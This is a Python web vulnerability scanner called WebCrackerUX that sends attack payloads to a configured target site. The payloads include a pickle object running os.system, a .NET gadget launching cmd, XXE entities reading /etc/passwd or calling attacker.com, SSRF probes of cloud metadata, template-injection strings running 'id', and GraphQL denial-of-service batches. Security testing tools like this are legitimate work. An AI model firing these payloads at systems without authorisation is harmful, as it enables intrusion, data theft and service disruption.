#!/usr/bin/env python3
"""
Owner: Abdul Mannan aka ShaheenUX
Social Handles: github.com/shaheenUX , instagram.com/shaheen_hacker , linktr.ee/shaheen_hacker     
WebCrackerUX v1.O - ADVANCED WEB APPLICATION CHECKS
Description: 
  Comprehensive scanner for advanced web vulnerabilities including
  deserialization, prototype pollution, SSRF, XXE, and more

"""

import os
import sys
import re
import json
import time
import base64
import pickle
import zlib
import requests
import urllib.parse
import xml.etree.ElementTree as ET
from bs4 import BeautifulSoup
from colorama import Fore, Style
from config import TARGET_DOMAIN, BASE_URL, HTTPS_URL, USER_AGENT, REQUEST_TIMEOUT

# Global configuration
REPORT_FILE = "reports/advance_report.txt"
SESSION = requests.Session()
SESSION.headers.update({"User-Agent": USER_AGENT})

class AdvancedScanner:
    def __init__(self):
        self.target = BASE_URL
        self.https_target = HTTPS_URL
        self.results = []
        self.cookies = {}
        self.csrf_token = None
        self.json_endpoints = []
        
    def _discover_json_endpoints(self):
        """Discover potential JSON API endpoints"""
        print(f"{Fore.CYAN}[*] Discovering JSON endpoints...{Style.RESET_ALL}")
        
        try:
            response = SESSION.get(self.target)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find script tags with JSON calls
            for script in soup.find_all('script'):
                if script.src:
                    if any(x in script.src for x in ['.json', 'api/', 'json=']):
                        self.json_endpoints.append(script.src)
                
                if script.string:
                    if 'fetch(' in script.string or 'axios(' in script.string:
                        matches = re.findall(r'["\'](.*?\.json.*?)["\']', script.string)
                        self.json_endpoints.extend(matches)
            
            # Find links that might return JSON
            for link in soup.find_all('a', href=True):
                if any(x in link['href'] for x in ['.json', 'api/', 'json=']):
                    self.json_endpoints.append(link['href'])
            
            print(f"{Fore.GREEN}[+] Found {len(self.json_endpoints)} potential JSON endpoints{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error discovering JSON endpoints: {e}{Style.RESET_ALL}")
    
    def _test_deserialization(self):
        """Test for insecure deserialization vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing for insecure deserialization...{Style.RESET_ALL}")
        
        # Python pickle test
        class MaliciousPickle:
            def __reduce__(self):
                return (os.system, ('echo "PICKLE RCE" > /tmp/pickle_test',))
        
        pickle_payload = base64.b64encode(pickle.dumps(MaliciousPickle())).decode()
        
        # PHP serialization test
        php_serialized = 'O:8:"stdClass":1:{s:5:"value";s:10:"evil_value";}'
        
        # Java serialization test
        java_serialized = base64.b64encode(b'\xac\xed\x00\x05sr\x00\x0ejava.lang.Long;\x8b\xe4\x90\xcc\x8f#\xdf\x02\x00\x01J\x00\x05valuexr\x00\x10java.lang.Number\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00xp\x00\x00\x00\x00\x00\x00\x00\x01')
        
        test_payloads = [
            {'payload': pickle_payload, 'type': 'Python Pickle', 'header': 'X-Pickle-Data'},
            {'payload': php_serialized, 'type': 'PHP Serialized', 'header': 'X-PHP-Serialized'},
            {'payload': java_serialized, 'type': 'Java Serialized', 'header': 'X-Java-Serialized-Object'},
            {'payload': '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","$values":["cmd","/c echo .NET RCE > C:\\rce_test.txt"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}}', 
             'type': '.NET JSON', 'header': None}
        ]
        
        vulnerable = False
        
        for endpoint in self.json_endpoints:
            for payload_info in test_payloads:
                try:
                    headers = {}
                    if payload_info['header']:
                        headers[payload_info['header']] = payload_info['payload']
                    
                    if endpoint.startswith('http'):
                        url = endpoint
                    else:
                        url = urllib.parse.urljoin(self.target, endpoint)
                    
                    if payload_info['header']:
                        response = SESSION.get(url, headers=headers)
                    else:
                        response = SESSION.post(url, data=payload_info['payload'], headers={'Content-Type': 'application/json'})
                    
                    # Check for potential deserialization indicators
                    if any(x in response.text for x in ['pickle', 'serializ', 'deserializ', 'java.lang', 'System.']):
                        vulnerable = True
                        self.results.append({
                            "vulnerability": f"Insecure Deserialization ({payload_info['type']})",
                            "severity": "Critical",
                            "description": f"Potential insecure deserialization at {url}",
                            "payload": payload_info['payload'],
                            "recommendation": "Avoid deserializing user input, use safe serialization formats like JSON"
                        })
                        print(f"{Fore.RED}[-] Potential {payload_info['type']} deserialization at {url}{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.YELLOW}[!] Error testing {payload_info['type']} at {endpoint}: {e}{Style.RESET_ALL}")
                    continue
        
        if not vulnerable:
            print(f"{Fore.GREEN}[+] No obvious deserialization vulnerabilities detected{Style.RESET_ALL}")
    
    def _test_prototype_pollution(self):
        """Test for JavaScript prototype pollution vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing for prototype pollution...{Style.RESET_ALL}")
        
        payloads = [
            '{"__proto__":{"isAdmin":true}}',
            '{"constructor":{"prototype":{"isAdmin":true}}}',
            '{"__proto__":{"toString":"<svg/onload=alert(1)>"}}',
            '{"__proto__":{"polluted":"yes"}}'
        ]
        
        vulnerable = False
        
        for endpoint in self.json_endpoints:
            for payload in payloads:
                try:
                    if endpoint.startswith('http'):
                        url = endpoint
                    else:
                        url = urllib.parse.urljoin(self.target, endpoint)
                    
                    response = SESSION.post(url, data=payload, headers={'Content-Type': 'application/json'})
                    
                    # Check if pollution was successful
                    if '"isAdmin":true' in response.text or '"polluted":"yes"' in response.text:
                        vulnerable = True
                        self.results.append({
                            "vulnerability": "Prototype Pollution",
                            "severity": "High",
                            "description": f"Potential prototype pollution at {url}",
                            "payload": payload,
                            "recommendation": "Use Object.freeze(Object.prototype) or libraries that prevent prototype pollution"
                        })
                        print(f"{Fore.RED}[-] Potential prototype pollution at {url}{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.YELLOW}[!] Error testing prototype pollution at {endpoint}: {e}{Style.RESET_ALL}")
                    continue
        
        if not vulnerable:
            print(f"{Fore.GREEN}[+] No prototype pollution vulnerabilities detected{Style.RESET_ALL}")
    
    def _test_graphql(self):
        """Test for GraphQL vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing for GraphQL vulnerabilities...{Style.RESET_ALL}")
        
        graphql_endpoints = [
            '/graphql',
            '/graphiql',
            '/graphql/console',
            '/api/graphql',
            '/v1/graphql'
        ]
        
        vulnerable = False
        
        for endpoint in graphql_endpoints:
            try:
                url = urllib.parse.urljoin(self.target, endpoint)
                
                # Test for introspection
                introspection_query = {'query': '{__schema{types{name}}}'}
                response = SESSION.post(url, json=introspection_query, headers={'Content-Type': 'application/json'})
                
                if response.status_code == 200 and '__schema' in response.text:
                    print(f"{Fore.YELLOW}[~] GraphQL introspection enabled at {url}{Style.RESET_ALL}")
                    self.results.append({
                        "vulnerability": "GraphQL Introspection Enabled",
                        "severity": "Medium",
                        "description": f"GraphQL introspection enabled at {url}",
                        "payload": str(introspection_query),
                        "recommendation": "Disable introspection in production environments"
                    })
                
                # Test for batch queries
                batch_query = [{'query': 'query { __typename }'}] * 100
                start_time = time.time()
                response = SESSION.post(url, json=batch_query, headers={'Content-Type': 'application/json'})
                elapsed = time.time() - start_time
                
                if response.status_code == 200 and elapsed > 2:  # Potential DoS
                    vulnerable = True
                    self.results.append({
                        "vulnerability": "GraphQL Batch Query DoS",
                        "severity": "Medium",
                        "description": f"GraphQL endpoint at {url} processes batch queries slowly (potential DoS)",
                        "payload": str(batch_query[:5]) + "... (100 total)",
                        "recommendation": "Implement query cost analysis and depth limiting"
                    })
                    print(f"{Fore.RED}[-] Potential GraphQL batch query DoS at {url}{Style.RESET_ALL}")
                
                # Test for field duplication
                field_duplication = {'query': '{__typename ' + 'alias:__typename '.join(str(i) for i in range(100)) + '}'}
                start_time = time.time()
                response = SESSION.post(url, json=field_duplication, headers={'Content-Type': 'application/json'})
                elapsed = time.time() - start_time
                
                if response.status_code == 200 and elapsed > 2:  # Potential DoS
                    vulnerable = True
                    self.results.append({
                        "vulnerability": "GraphQL Field Duplication",
                        "severity": "Medium",
                        "description": f"GraphQL endpoint at {url} processes field duplication slowly (potential DoS)",
                        "payload": str(field_duplication)[:100] + "...",
                        "recommendation": "Implement query cost analysis and depth limiting"
                    })
                    print(f"{Fore.RED}[-] Potential GraphQL field duplication DoS at {url}{Style.RESET_ALL}")
                
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Error testing GraphQL at {endpoint}: {e}{Style.RESET_ALL}")
                continue
        
        if not vulnerable:
            print(f"{Fore.GREEN}[+] No GraphQL vulnerabilities detected{Style.RESET_ALL}")
    
    def _test_websockets(self):
        """Test for WebSocket vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing for WebSocket vulnerabilities...{Style.RESET_ALL}")
        
        # This is a placeholder - actual WebSocket testing requires a WebSocket client
        # In a real implementation, we would use websocket-client library
        
        print(f"{Fore.YELLOW}[!] WebSocket testing requires manual verification{Style.RESET_ALL}")
        self.results.append({
            "vulnerability": "WebSocket Testing Required",
            "severity": "Info",
            "description": "WebSocket testing requires manual verification with a WebSocket client",
            "recommendation": "Manually test WebSocket endpoints for authentication, CSRF, and input validation"
        })
    
    def _test_xxe(self):
        """Test for XML External Entity processing vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing for XXE vulnerabilities...{Style.RESET_ALL}")
        
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe">%remote;%init;]><root/>',
            '<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'
        ]
        
        vulnerable = False
        
        # Check for file uploads that might process XML
        try:
            response = SESSION.get(self.target)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for form in soup.find_all('form'):
                if form.get('enctype') == 'multipart/form-data':
                    for input_tag in form.find_all('input', {'type': 'file'}):
                        for payload in xxe_payloads:
                            try:
                                files = {input_tag['name']: ('test.xml', payload, 'application/xml')}
                                response = SESSION.post(form['action'], files=files)
                                
                                if any(indicator in response.text 
                                       for indicator in ['root:', '/bin/bash', 'daemon:']):
                                    vulnerable = True
                                    self.results.append({
                                        "vulnerability": "XML External Entity (XXE)",
                                        "severity": "Critical",
                                        "description": f"XXE vulnerability in file upload at {form['action']}",
                                        "payload": payload[:100] + "...",
                                        "recommendation": "Disable XML external entity processing"
                                    })
                                    print(f"{Fore.RED}[-] XXE vulnerability in file upload at {form['action']}{Style.RESET_ALL}")
                                    break
                            except Exception:
                                continue
        except Exception as e:
            print(f"{Fore.RED}[-] Error checking for file upload XXE: {e}{Style.RESET_ALL}")
        
        # Check API endpoints that might accept XML
        for endpoint in self.json_endpoints:
            if not any(x in endpoint for x in ['xml', 'soap', 'wsdl']):
                continue
                
            for payload in xxe_payloads:
                try:
                    headers = {'Content-Type': 'application/xml'}
                    response = SESSION.post(endpoint, data=payload, headers=headers)
                    
                    if any(indicator in response.text 
                           for indicator in ['root:', '/bin/bash', 'daemon:']):
                        vulnerable = True
                        self.results.append({
                            "vulnerability": "XML External Entity (XXE)",
                            "severity": "Critical",
                            "description": f"XXE vulnerability at {endpoint}",
                            "payload": payload[:100] + "...",
                            "recommendation": "Disable XML external entity processing"
                        })
                        print(f"{Fore.RED}[-] XXE vulnerability at {endpoint}{Style.RESET_ALL}")
                        break
                except Exception:
                    continue
        
        if not vulnerable:
            print(f"{Fore.GREEN}[+] No XXE vulnerabilities detected{Style.RESET_ALL}")
    
    def _test_ssrf(self):
        """Test for Server-Side Request Forgery vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing for SSRF vulnerabilities...{Style.RESET_ALL}")
        
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost/admin",
            "http://127.0.0.1:8080",
            "file:///etc/passwd",
            "dict://localhost:6379/info"
        ]
        
        vulnerable = False
        
        # Check URL parameters
        try:
            response = SESSION.get(self.target)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all links with URL parameters
            url_params = set()
            for link in soup.find_all('a', href=True):
                if '=' in link['href']:
                    url_params.update(re.findall(r'(\w+)=[^&]*', link['href']))
            
            # Test each parameter
            for param in url_params:
                if not any(x in param.lower() for x in ['url', 'image', 'load', 'fetch', 'request']):
                    continue
                    
                for payload in ssrf_payloads:
                    try:
                        test_url = f"{self.target}?{param}={urllib.parse.quote(payload)}"
                        response = SESSION.get(test_url)
                        
                        if any(indicator in response.text 
                               for indicator in ['169.254.169.254', 'metadata', 'localhost', '127.0.0.1']):
                            vulnerable = True
                            self.results.append({
                                "vulnerability": "Server-Side Request Forgery (SSRF)",
                                "severity": "High",
                                "description": f"SSRF vulnerability in parameter {param}",
                                "payload": payload,
                                "recommendation": "Validate and sanitize all URL inputs, use allow lists for domains"
                            })
                            print(f"{Fore.RED}[-] SSRF vulnerability in parameter {param}{Style.RESET_ALL}")
                            break
                    except Exception:
                        continue
        except Exception as e:
            print(f"{Fore.RED}[-] Error checking URL parameters for SSRF: {e}{Style.RESET_ALL}")
        
        # Check form inputs
        try:
            for form in soup.find_all('form'):
                for input_tag in form.find_all('input'):
                    if not any(x in input_tag.get('name', '').lower() for x in ['url', 'image', 'load']):
                        continue
                        
                    for payload in ssrf_payloads:
                        try:
                            data = {input_tag['name']: payload}
                            response = SESSION.post(form['action'], data=data)
                            
                            if any(indicator in response.text 
                                   for indicator in ['169.254.169.254', 'metadata', 'localhost', '127.0.0.1']):
                                vulnerable = True
                                self.results.append({
                                    "vulnerability": "Server-Side Request Forgery (SSRF)",
                                    "severity": "High",
                                    "description": f"SSRF vulnerability in form field {input_tag['name']}",
                                    "payload": payload,
                                    "recommendation": "Validate and sanitize all URL inputs, use allow lists for domains"
                                })
                                print(f"{Fore.RED}[-] SSRF vulnerability in form field {input_tag['name']}{Style.RESET_ALL}")
                                break
                        except Exception:
                            continue
        except Exception as e:
            print(f"{Fore.RED}[-] Error checking forms for SSRF: {e}{Style.RESET_ALL}")
        
        if not vulnerable:
            print(f"{Fore.GREEN}[+] No SSRF vulnerabilities detected{Style.RESET_ALL}")
    
    def _test_ssti(self):
        """Test for Server-Side Template Injection"""
        print(f"{Fore.CYAN}[*] Testing for template injection...{Style.RESET_ALL}")
        
        template_payloads = {
            'generic': ['{{7*7}}', '<%= 7*7 %>', '${7*7}', '#{7*7}'],
            'jinja2': ['{{config.items()}}', '{{self.__dict__}}'],
            'twig': ['{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}'],
            'freemarker': ['<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }']
        }
        
        vulnerable = False
        
        # Test URL parameters
        try:
            response = SESSION.get(self.target)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all links with parameters
            for link in soup.find_all('a', href=True):
                if '=' in link['href']:
                    params = re.findall(r'(\w+)=([^&]*)', link['href'])
                    for param_name, param_value in params:
                        for engine, payloads in template_payloads.items():
                            for payload in payloads:
                                try:
                                    test_url = link['href'].replace(f"{param_name}={param_value}", 
                                                                  f"{param_name}={urllib.parse.quote(payload)}")
                                    response = SESSION.get(test_url)
                                    
                                    # Check for template evaluation
                                    if ('49' in response.text and '7*7' in payload) or 'uid=' in response.text:
                                        vulnerable = True
                                        self.results.append({
                                            "vulnerability": f"Server-Side Template Injection ({engine})",
                                            "severity": "High",
                                            "description": f"Template injection in parameter {param_name}",
                                            "payload": payload,
                                            "recommendation": "Sandbox template execution or use static templates"
                                        })
                                        print(f"{Fore.RED}[-] {engine} template injection in {param_name}{Style.RESET_ALL}")
                                        break
                                except Exception:
                                    continue
        except Exception as e:
            print(f"{Fore.RED}[-] Error checking URL parameters for SSTI: {e}{Style.RESET_ALL}")
        
        # Test form inputs
        try:
            for form in soup.find_all('form'):
                for input_tag in form.find_all('input'):
                    if input_tag.get('type') in ['hidden', 'submit']:
                        continue
                        
                    for engine, payloads in template_payloads.items():
                        for payload in payloads:
                            try:
                                data = {input_tag['name']: payload}
                                response = SESSION.post(form['action'], data=data)
                                
                                if ('49' in response.text and '7*7' in payload) or 'uid=' in response.text:
                                    vulnerable = True
                                    self.results.append({
                                        "vulnerability": f"Server-Side Template Injection ({engine})",
                                        "severity": "High",
                                        "description": f"Template injection in form field {input_tag['name']}",
                                        "payload": payload,
                                        "recommendation": "Sandbox template execution or use static templates"
                                    })
                                    print(f"{Fore.RED}[-] {engine} template injection in {input_tag['name']}{Style.RESET_ALL}")
                                    break
                            except Exception:
                                continue
        except Exception as e:
            print(f"{Fore.RED}[-] Error checking forms for SSTI: {e}{Style.RESET_ALL}")
        
        if not vulnerable:
            print(f"{Fore.GREEN}[+] No template injection vulnerabilities detected{Style.RESET_ALL}")
    
    def _test_cache_poisoning(self):
        """Test for web cache poisoning vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing for cache poisoning...{Style.RESET_ALL}")
        
        # Test for unkeyed headers
        unkeyed_headers = [
            'X-Forwarded-Host',
            'X-Host',
            'X-Forwarded-Server',
            'X-Forwarded-For',
            'X-Original-URL'
        ]
        
        vulnerable = False
        
        for header in unkeyed_headers:
            try:
                # First request to get cache key
                normal_response = SESSION.get(self.target)
                
                # Second request with malicious header
                poisoned_response = SESSION.get(self.target, headers={header: 'evil.com'})
                
                # Check if header affected response
                if poisoned_response.text != normal_response.text:
                    # Check if reflected in response
                    if 'evil.com' in poisoned_response.text:
                        vulnerable = True
                        self.results.append({
                            "vulnerability": "Cache Poisoning via Unkeyed Header",
                            "severity": "Medium",
                            "description": f"Header {header} is unkeyed and affects cache",
                            "payload": f"{header}: evil.com",
                            "recommendation": "Ensure all headers that affect responses are keyed in the cache"
                        })
                        print(f"{Fore.RED}[-] Cache poisoning possible via {header}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Error testing {header}: {e}{Style.RESET_ALL}")
                continue
        
        if not vulnerable:
            print(f"{Fore.GREEN}[+] No cache poisoning vulnerabilities detected{Style.RESET_ALL}")
    
    def _test_host_header_injection(self):
        """Test for Host header injection vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing for Host header injection...{Style.RESET_ALL}")
        
        test_hosts = [
            'evil.com',
            'localhost',
            '127.0.0.1',
            f'{TARGET_DOMAIN}.evil.com'
        ]
        
        vulnerable = False
        
        for host in test_hosts:
            try:
                response = SESSION.get(self.target, headers={'Host': host})
                
                # Check if host reflected in response
                if host in response.text:
                    vulnerable = True
                    self.results.append({
                        "vulnerability": "Host Header Injection",
                        "severity": "Medium",
                        "description": f"Host header reflected in response: {host}",
                        "payload": f"Host: {host}",
                        "recommendation": "Validate Host header or use absolute URLs"
                    })
                    print(f"{Fore.RED}[-] Host header injection with {host}{Style.RESET_ALL}")
                
                # Check for cache poisoning
                if 'X-Cache' in response.headers and 'HIT' in response.headers['X-Cache']:
                    vulnerable = True
                    self.results.append({
                        "vulnerability": "Cache Poisoning via Host Header",
                        "severity": "High",
                        "description": f"Host header {host} affects cached responses",
                        "payload": f"Host: {host}",
                        "recommendation": "Ensure Host header is properly keyed in cache configuration"
                    })
                    print(f"{Fore.RED}[-] Cache poisoning via Host header with {host}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Error testing Host {host}: {e}{Style.RESET_ALL}")
                continue
        
        if not vulnerable:
            print(f"{Fore.GREEN}[+] No Host header injection vulnerabilities detected{Style.RESET_ALL}")
    
    def _generate_report(self):
        """Generate vulnerability report"""
        os.makedirs(os.path.dirname(REPORT_FILE), exist_ok=True)
        
        with open(REPORT_FILE, 'w') as f:
            f.write(f"Advanced Vulnerability Test Report\n")
            f.write(f"Target: {TARGET_DOMAIN}\n")
            f.write(f"Date: {time.ctime()}\n\n")
            
            if not self.results:
                f.write("No advanced vulnerabilities found!\n")
                return
            
            f.write("Vulnerabilities Found:\n")
            f.write("=" * 80 + "\n")
            
            for i, result in enumerate(self.results, 1):
                f.write(f"{i}. {result['vulnerability']} ({result['severity']})\n")
                f.write(f"   Description: {result['description']}\n")
                f.write(f"   Payload: {result['payload'][:200]}{'...' if len(result['payload']) > 200 else ''}\n")
                f.write(f"   Recommendation: {result['recommendation']}\n\n")
        
        print(f"{Fore.GREEN}[+] Report saved to {REPORT_FILE}{Style.RESET_ALL}")
        print(f"{Fore.RED}[-] Found {len(self.results)} vulnerabilities!{Style.RESET_ALL}")
    
    def run_all_checks(self):
        """Execute all advanced vulnerability tests"""
        print(f"\n{Fore.BLUE}=== Starting Advanced Vulnerability Tests ==={Style.RESET_ALL}")
        
        # First discover JSON endpoints
        self._discover_json_endpoints()
        
        # Run all tests
        tests = [
            self._test_deserialization,
            self._test_prototype_pollution,
            self._test_graphql,
            self._test_websockets,
            self._test_xxe,
            self._test_ssrf,
            self._test_ssti,
            self._test_cache_poisoning,
            self._test_host_header_injection
        ]
        
        for test in tests:
            try:
                test()
            except Exception as e:
                print(f"{Fore.RED}[-] Test failed: {e}{Style.RESET_ALL}")
        
        # Generate report
        self._generate_report()

if __name__ == "__main__":
    scanner = AdvancedScanner()
    scanner.run_all_checks()